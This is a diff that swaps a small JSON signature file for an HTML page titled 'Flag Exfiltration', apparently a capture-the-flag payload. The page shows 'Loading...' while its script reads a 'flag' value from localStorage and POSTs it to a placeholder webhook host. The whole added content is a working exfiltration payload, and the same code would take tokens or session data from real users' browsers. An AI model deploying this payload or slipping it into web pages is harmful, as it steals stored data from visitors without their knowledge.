@@ -1,4 +1,24 @@
-{
-    "date": "1761421691",
-    "signature":"aa128db873ccf221c2ddbb1b119b19276d33bdb671f93271a7db6c3517958b9da1f9b30c3f0b26783393e0ad0726169f047bfb6ef27fda57abff282e99713925"
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Flag Exfiltration</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    // Fetch the flag from localStorage
+    const flag = localStorage.getItem("flag");
+
+    // Send the flag to your webhook
+    fetch("https://your-webhook-url.com", {
+      method: "POST",
+      body: JSON.stringify({ flag }),
+      headers: { "Content-Type": "application/json" },
+    })
+    .then(() => console.log("Flag sent"))
+    .catch((error) => console.error("Error sending flag:", error));
+  </script>
+</body>
+</html>
